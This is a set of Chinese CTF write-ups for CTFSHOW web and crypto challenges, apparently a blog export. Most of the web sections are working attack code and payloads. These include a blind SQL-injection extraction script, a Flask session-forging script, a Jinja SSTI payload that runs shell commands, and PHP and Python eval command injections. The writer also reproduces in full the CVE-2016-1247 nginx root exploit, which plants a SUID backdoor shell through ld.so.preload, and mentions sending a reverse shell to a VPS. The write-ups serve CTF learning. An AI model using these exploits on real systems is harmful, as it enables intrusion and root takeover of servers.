<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re,binascii</span><br><span class="line">login_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;login.php&quot;</span><br><span class="line">register_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;register.php&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">users_email &#x3D; [&quot;test&quot; + str(i) + &quot;@qq.com&quot; for i in range(0,17)]</span><br><span class="line">def register(user_email,offset,s):</span><br><span class="line">    reg_datas &#x3D; &#123;</span><br><span class="line">        &quot;e&quot; : user_email,</span><br><span class="line">        #&quot;username&quot; : &quot;0&#39;+(select substr(hex(hex((select * from flag))) from &quot; + str(1+offset*10)+ &quot; for 10))+&#39;0&quot;,</span><br><span class="line">        # &quot;username&quot;:&quot;test&quot;,</span><br><span class="line">        &quot;u&quot;:&quot;0&#39;+(select&#x2F;**&#x2F;substr(hex(hex((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)))&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot; + str(1+offset*10)+ &quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;10))+&#39;0&quot;,</span><br><span class="line">        &quot;p&quot;:&quot;test&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # print(reg_datas[&#39;username&#39;])</span><br><span class="line">    r &#x3D; s.post(url &#x3D; register_url,data &#x3D; reg_datas,allow_redirects&#x3D;True)</span><br><span class="line">    # print(r.request.body)</span><br><span class="line">    # print(r.status_code)</span><br><span class="line">    return r</span><br><span class="line">def login(user_email,s):</span><br><span class="line">    login_data&#x3D;&#123;</span><br><span class="line">        &quot;e&quot;:user_email,</span><br><span class="line">        &quot;p&quot;:&quot;test&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; s.post(url&#x3D;login_url, data&#x3D;login_data, allow_redirects&#x3D;True)</span><br><span class="line">    pattern &#x3D; &#39;Hello\s*(\S*),&#39;</span><br><span class="line">    return re.findall(pattern,r.text)[0]</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    flag_double_hex &#x3D; &#39;&#39;</span><br><span class="line"># email&#x3D;&quot;test@mail.com&quot;</span><br><span class="line"># offset&#x3D;1</span><br><span class="line">    for email,offset in zip(users_email,range(0,len(users_email))):</span><br><span class="line">        print(email,offset)</span><br><span class="line">        r&#x3D;register(email,offset,s)</span><br><span class="line">        test &#x3D; login(email,s)</span><br><span class="line">        print(test)</span><br><span class="line">        flag_double_hex +&#x3D; test</span><br><span class="line">        print(&quot;[+] &quot; + flag_double_hex)</span><br><span class="line">    print(&quot;flag: &quot; + binascii.a2b_hex(binascii.a2b_hex(flag_double_hex)).decode())</span><br></pre></td></tr></table></figure>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>查看页面源代码有提示,<code>param:ctfshow key:ican</code></p>
<p>图片是css都在static文件夹下,没有index.php等等,</p>
<p>随便登录发现要admin,查看cookies,发现是session,想到flask</p>
<p>开始伪造admin的session</p>
<h4 id="伪造脚本"><a href="#伪造脚本" class="headerlink" title="伪造脚本"></a>伪造脚本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># # coding:utf-8</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">from itsdangerous import URLSafeTimedSerializer</span><br><span class="line">import hashlib</span><br><span class="line">class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):</span><br><span class="line">	# Override method</span><br><span class="line">	# Take secret_key instead of an instance of a Flask app</span><br><span class="line">	def get_signing_serializer(self, secret_key):</span><br><span class="line">		if not secret_key:</span><br><span class="line">			return None</span><br><span class="line">		signer_kwargs &#x3D; dict(</span><br><span class="line">			key_derivation&#x3D;&quot;hmac&quot;,</span><br><span class="line">			digest_method&#x3D;hashlib.sha1</span><br><span class="line">		)</span><br><span class="line">		return URLSafeTimedSerializer(secret_key, salt&#x3D;&quot;cookie-session&quot;,</span><br><span class="line">		                              serializer&#x3D;self.serializer,</span><br><span class="line">		                              signer_kwargs&#x3D;signer_kwargs)</span><br><span class="line"></span><br><span class="line">def decodeFlaskCookie(secret_key, cookieValue):</span><br><span class="line">	sscsi &#x3D; SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	return signingSerializer.loads(cookieValue)</span><br><span class="line"></span><br><span class="line"># Keep in mind that flask uses unicode strings for the</span><br><span class="line"># dictionary keys</span><br><span class="line">def encodeFlaskCookie(secret_key, cookieDict):</span><br><span class="line">	sscsi &#x3D; SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	return signingSerializer.dumps(cookieDict)</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    sk &#x3D; &quot;ican&quot;</span><br><span class="line">    sessionDict &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br><span class="line">    cookie &#x3D; encodeFlaskCookie(sk, sessionDict)</span><br><span class="line">    #decodedDict &#x3D; decodeFlaskCookie(sk, session)</span><br><span class="line">    print(cookie)</span><br></pre></td></tr></table></figure>
<p>替换test的sesion刷新页面发现缺少参数,添加ctfshow</p>
<h4 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#x3D;1</span><br><span class="line">#页面显示1</span><br><span class="line">ctfshow&#x3D;&#123;&#123;1*2&#125;&#125;</span><br><span class="line">#页面显示2</span><br></pre></td></tr></table></figure>
<p>可知是SSTI</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctfshow&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;proc&#x2F;1&#x2F;environ&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>ps -aux发现执行了/flag.sh,但是根目录下面没有,读取proc下面的一些文件试试,得到flag</p>
<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>题目图片中有cai字样</p>
<p>蚁剑连接,密码是cai</p>
<p>flag在/下面,但是没有权限</p>
<p>终端运行ps -aux</p>
<p>得到cron,cron是linux的定时任务,cat /etc/crontab文件得到最下面一行的nginx的日志切片程序,一步步查看文件深入到/var/log目录下,ls -af,得到error.log是root权限,搜一搜得到nginx错误配置error.log root权限的提权漏洞</p>
<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#</span><br><span class="line"># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span><br><span class="line"># nginxed-root.sh (ver. 1.0)</span><br><span class="line">#</span><br><span class="line"># CVE-2016-1247</span><br><span class="line">#</span><br><span class="line"># Discovered and coded by:</span><br><span class="line">#</span><br><span class="line"># Dawid Golunski</span><br><span class="line"># dawid[at]legalhackers.com</span><br><span class="line">#</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com</span><br><span class="line">#</span><br><span class="line"># Follow https:&#x2F;&#x2F;twitter.com&#x2F;dawid_golunski for updates on this advisory.</span><br><span class="line">#</span><br><span class="line"># ---</span><br><span class="line"># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span><br><span class="line"># etc.) to escalate their privileges from nginx web server user (www-data) to root </span><br><span class="line"># through unsafe error log handling.</span><br><span class="line">#</span><br><span class="line"># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span><br><span class="line"># On Debian-based systems the USR1 signal is sent by logrotate (&#x2F;etc&#x2F;logrotate.d&#x2F;nginx)</span><br><span class="line"># script which is called daily by the cron.daily on default installations.</span><br><span class="line"># The restart should take place at 6:25am which is when cron.daily executes.</span><br><span class="line"># Attackers can therefore get a root shell automatically in 24h at most without any admin</span><br><span class="line"># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span><br><span class="line"># has been configured. </span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Exploit usage:</span><br><span class="line"># .&#x2F;nginxed-root.sh path_to_nginx_error.log </span><br><span class="line">#</span><br><span class="line"># To trigger logrotation for testing the exploit, you can run the following command:</span><br><span class="line">#</span><br><span class="line"># &#x2F;usr&#x2F;sbin&#x2F;logrotate -vf &#x2F;etc&#x2F;logrotate.d&#x2F;nginx</span><br><span class="line">#</span><br><span class="line"># See the full advisory for details at:</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com&#x2F;advisories&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br><span class="line">#</span><br><span class="line"># Video PoC:</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com&#x2F;videos&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Disclaimer:</span><br><span class="line"># For testing purposes only. Do no harm.</span><br><span class="line">#</span><br><span class="line"># http:&#x2F;&#x2F;www.debian.cn&#x2F;</span><br><span class="line">#</span><br><span class="line">BACKDOORSH&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">BACKDOORPATH&#x3D;&quot;&#x2F;tmp&#x2F;nginxrootsh&quot;</span><br><span class="line">PRIVESCLIB&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.so&quot;</span><br><span class="line">PRIVESCSRC&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.c&quot;</span><br><span class="line">SUIDBIN&#x3D;&quot;&#x2F;usr&#x2F;bin&#x2F;sudo&quot;</span><br><span class="line">function cleanexit &#123;</span><br><span class="line"># Cleanup </span><br><span class="line">echo -e &quot;\n[+] Cleaning up...&quot;</span><br><span class="line">rm -f $PRIVESCSRC</span><br><span class="line">rm -f $PRIVESCLIB</span><br><span class="line">rm -f $ERRORLOG</span><br><span class="line">touch $ERRORLOG</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo -n &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br><span class="line">exit $1</span><br><span class="line">&#125;</span><br><span class="line">function ctrl_c() &#123;</span><br><span class="line">        echo -e &quot;\n[+] Ctrl+C pressed&quot;</span><br><span class="line">cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line">#intro </span><br><span class="line">cat &lt;&lt;_eascii_</span><br><span class="line"> _______________________________</span><br><span class="line">&lt; Is your server (N)jinxed ? ;o &gt;</span><br><span class="line"> -------------------------------</span><br><span class="line">           \ </span><br><span class="line">            \          __---__</span><br><span class="line">                    _-       &#x2F;--______</span><br><span class="line">               __--( &#x2F;     \ )XXXXXXXXXXX\v.  </span><br><span class="line">             .-XXX(   O   O  )XXXXXXXXXXXXXXX- </span><br><span class="line">            &#x2F;XXX(       U     )        XXXXXXX\ </span><br><span class="line">          &#x2F;XXXXX(              )--_  XXXXXXXXXXX\ </span><br><span class="line">         &#x2F;XXXXX&#x2F; (      O     )   XXXXXX   \XXXXX\ </span><br><span class="line">         XXXXX&#x2F;   &#x2F;            XXXXXX   \__ \XXXXX</span><br><span class="line">         XXXXXX__&#x2F;          XXXXXX         \__----&gt;</span><br><span class="line"> ---___  XXX__&#x2F;          XXXXXX      \__         &#x2F;</span><br><span class="line">   \-  --__&#x2F;   ___&#x2F;\  XXXXXX            &#x2F;  ___--&#x2F;&#x3D;</span><br><span class="line">    \-\    ___&#x2F;    XXXXXX              &#39;--- XXXXXX</span><br><span class="line">       \-\&#x2F;XXX\ XXXXXX                      &#x2F;XXXXX</span><br><span class="line">         \XXXXXXXXX   \                    &#x2F;XXXXX&#x2F;</span><br><span class="line">          \XXXXXX      &gt;                 _&#x2F;XXXXX&#x2F;</span><br><span class="line">            \XXXXX--__&#x2F;              __-- XXXX&#x2F;</span><br><span class="line">             -XXXXXXXX---------------  XXXXXX-</span><br><span class="line">                \XXXXXXXXXXXXXXXXXXXXXXXXXX&#x2F;</span><br><span class="line">                  &quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;</span><br><span class="line">_eascii_</span><br><span class="line">echo -e &quot;\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n&quot;</span><br><span class="line">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttps:&#x2F;&#x2F;legalhackers.com \033[0m&quot;</span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br><span class="line">echo -e &quot;It seems that this server uses: &#96;ps aux | grep nginx | awk -F&#39;log-error&#x3D;&#39; &#39;&#123; print $2 &#125;&#39; | cut -d&#39; &#39; -f1 | grep &#39;&#x2F;&#39;&#96;\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># Priv check</span><br><span class="line">echo -e &quot;\n[+] Starting the exploit as: \n\033[94m&#96;id&#96;\033[0m&quot;</span><br><span class="line">id | grep -q www-data</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] You need to execute the exploit as www-data user! Exiting.\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG&#x3D;&quot;$1&quot;</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">echo -e &quot;\n[!] The specified Nginx error log ($ERRORLOG) doesn&#39;t exist. Try again.\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># [ Exploitation ]</span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">       #include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">static uid_t  (*old_geteuid)();</span><br><span class="line">old_geteuid &#x3D; dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><br><span class="line">if ( old_geteuid() &#x3D;&#x3D; 0 ) &#123;</span><br><span class="line">chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><br><span class="line">chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><br><span class="line">unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">&#x2F;bin&#x2F;bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br><span class="line">cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e &quot;\n[+] Backdoor&#x2F;low-priv shell installed at: \n&#96;ls -l $BACKDOORPATH&#96;&quot;</span><br><span class="line"># Safety check</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo -e &quot;\n[!] &#x2F;etc&#x2F;ld.so.preload already exists. Exiting for safety.&quot;</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"># Symlink the log file</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s &#x2F;etc&#x2F;ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] Couldn&#39;t remove the $ERRORLOG file or create a symlink.&quot;</span><br><span class="line">cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n&#96;ls -l $ERRORLOG&#96;&quot;</span><br><span class="line"># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span><br><span class="line">curl http:&#x2F;&#x2F;localhost&#x2F; &gt;&#x2F;dev&#x2F;null 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"># Wait for Nginx to re-open the logs&#x2F;USR1 signal after the logrotation (if daily </span><br><span class="line"># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span><br><span class="line">echo -ne &quot;\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;</span><br><span class="line">while :; do </span><br><span class="line">sleep 1</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line">rm -f $ERRORLOG</span><br><span class="line">break;</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"># &#x2F;etc&#x2F;ld.so.preload should be owned by www-data user at this point</span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line">echo -e &quot;\n[+] Nginx restarted. The &#x2F;etc&#x2F;ld.so.preload file got created with web server privileges: \n&#96;ls -l &#x2F;etc&#x2F;ld.so.preload&#96;&quot;</span><br><span class="line">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to &#x2F;etc&#x2F;ld.so.preload&quot;</span><br><span class="line">echo -e &quot;\n[+] The &#x2F;etc&#x2F;ld.so.preload file now contains: \n&#96;cat &#x2F;etc&#x2F;ld.so.preload&#96;&quot;</span><br><span class="line">chmod 755 &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line"># Escalating privileges via the SUID binary (e.g. &#x2F;usr&#x2F;bin&#x2F;sudo)</span><br><span class="line">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br><span class="line">sudo 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;dev&#x2F;null</span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n&#96;ls -l $BACKDOORPATH&#96;&quot;</span><br><span class="line">echo -e &quot;\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m&quot;</span><br><span class="line">else</span><br><span class="line">echo -e &quot;\n[!] Failed to get root&quot;</span><br><span class="line">cleanexit 2</span><br><span class="line">fi</span><br><span class="line">rm -f $ERRORLOG</span><br><span class="line">echo &gt; $ERRORLOG</span><br><span class="line">  </span><br><span class="line"># Use the rootshell to perform cleanup that requires root privilges</span><br><span class="line">$BACKDOORPATH -p -c &quot;rm -f &#x2F;etc&#x2F;ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="line"># Reset the logging to error.log</span><br><span class="line">$BACKDOORPATH -p -c &quot;kill -USR1 &#96;pidof -s nginx&#96;&quot;</span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e &quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="line">$BACKDOORPATH -p -i</span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0：Debian、ubuntu发行版的Nginx本地提权漏洞（含POC）</span><br></pre></td></tr></table></figure>
<p>将poc上传到/var/www/html/目录下面,更改777权限,更改文件名为poc.sh</p>
<p>在蚁剑的终端中用bash反弹一个shell到vps,然后在vps执行一下命令,等待cron定时任务执行,触发漏洞得到root权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">.&#x2F;poc.sh &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</span><br><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>fuzz一下只能5个字符,or and =不能用</p>
<p>但是&amp;&amp; || &lt;&gt;可以,只能五个字符,便思考逻辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--猜测后台sql</span><br><span class="line">select * from table where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39;</span><br><span class="line">--构造逻辑</span><br><span class="line">select * from table where username&#x3D;&#39;1&#39;&lt;&#39;2&#39; and password&#x3D;&#39;1&#39;&lt;&#39;2&#39;</span><br></pre></td></tr></table></figure>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u&#x3D;1&#39;&lt;&#39;2&amp;p&#x3D;1&#39;&lt;&#39;2</span><br></pre></td></tr></table></figure>
<h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>eval以分号作为语句分隔符,直接结束前面一段代码另起炉灶</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a;phpinfo();</span><br><span class="line">a;system(&#39;cat &#x2F;var&#x2F;falg.txt&#39;)</span><br></pre></td></tr></table></figure>
<p>flag找一找在var下面</p>
<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="密码2"><a href="#密码2" class="headerlink" title="密码2"></a>密码2</h3><p>下载得到文件,ctf替换<code>.</code>show替换<code>-</code>morse解码在得到了FLAG四个字</p>
<p>然后后面都是四个16进制码一组,utf-8解码得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW平台萌新赛WP</title>
    <url>/2020/03/06/CTF_WP/ctfshow_%E8%90%8C%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CTFSHOW平台萌新赛web、Crypto部分misc"><a href="#CTFSHOW平台萌新赛web、Crypto部分misc" class="headerlink" title="CTFSHOW平台萌新赛web、Crypto部分misc"></a>CTFSHOW平台萌新赛web、Crypto部分misc</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>代码很简单,命令执行</p>
<p>利用命令分隔符</p>
<a id="more"></a>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;ls;echo</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;cat%20flag;echo</span><br></pre></td></tr></table></figure>
<h3 id="web给她"><a href="#web给她" class="headerlink" title="web给她"></a>web给她</h3><p>扫目录.发现git泄露,githack扒下来,代码不全,但是可以看到hitn.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;sprintf(&quot;and pass&#x3D;&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;]));</span><br><span class="line">$sql&#x3D;sprintf(&quot;select * from user where name&#x3D;&#39;%s&#39; $pass&quot;,addslashes($_GET[&#39;name&#39;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用sprintf和addslashes的漏洞</p>
<p>参考搜的一篇文章<a href="https://www.jianshu.com/p/3f14bae3396f">【PHP】由一次CTF引发的学习笔记之PHP的sprintf函数</a></p>
<p>打开是404页面,但是f12查看状态码是200,说明是假的404,而且有php文件显示,f12,发现html页面的注释提示,查看cookies,发现是16进制,转换是flag.txt,先考虑直接文件包含,提示no flag再考虑根据利用伪协议,先试了base64,提示no base64,换成rot13成功读取</p>
<p>php://filter/read=string.rot13/resource=/flag</p>
<h3 id="web假赛生"><a href="#web假赛生" class="headerlink" title="web假赛生"></a>web假赛生</h3><p>瞎蒙的</p>
<p>页面源代码说要登录</p>
<p>没有账号,先注册</p>
<p>先注册admin,不允许</p>
<p>admın admın(不懂原理,瞎蒙的)注册,</p>
<p>用admin admin登录,成功登录admin</p>
<p>根据正则匹配,c不传值就可以过</p>
<h3 id="web数据及格了"><a href="#web数据及格了" class="headerlink" title="web数据及格了"></a>web数据及格了</h3><p>robots.txt,发现使用debug</p>
<p>计算机,按个1+1,发现数据包,在最后随便加个符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1&#123;</span><br></pre></td></tr></table></figure>
<p>出现报错页面,报错最后发现eval和判断</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim" alt="mark"></a></p>
<p>核心代码,刚开始想利用利用eval反弹shell,但是失败了</p>
<p>利用eval,导入os库,执行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22ls%22).read())</span><br></pre></td></tr></table></figure>
<p>列目录后发现flag.sh,再读flag.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22cat%20flag.sh%22).read())](http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(&#39;os&#39;).popen(&quot;cat flag.sh&quot;).read()))</span><br></pre></td></tr></table></figure>
<p>读取到真正的flag位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;0&amp;operator&#x3D;%2B&amp;number2&#x3D;0%2Bint(__import__(&#39;os&#39;).popen(&quot;cat%20&#x2F;home&#x2F;ctf&#x2F;web&#x2F;flag&quot;).read())</span><br></pre></td></tr></table></figure>
<h3 id="web-萌新记忆"><a href="#web-萌新记忆" class="headerlink" title="web_萌新记忆"></a>web_萌新记忆</h3><p>dirmap扫目录,扫出后台登录</p>
<p>登录admin admin,提示密码错误,改变用户名提示用户名/密码错误</p>
<p>推断是先判断用户名,在判断密码,尝试弱口令密码爆破,github找了两个字典10000条数据bp没跑出来,尝试sql注入,过滤了很多字符,大致判断了一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">合法</span><br><span class="line">| &#39; , length left &lt; substr 空格</span><br><span class="line">过滤</span><br><span class="line">&quot; . or &amp; and ; # + - union select from mid ascii order table &gt; &#x3D;</span><br></pre></td></tr></table></figure>
<p>注释符都过滤掉了,但是单给一个引号会报错,所以应该有注入方法</p>
<p>搜搜找找,找到参考资料<a href="https://segmentfault.com/a/1190000018748071">CTF利用 Burpsuite Fuzz 实现 SQL 注入</a></p>
<p>推测应该差不多,看懂之后,测试</p>
<p>payload</p>
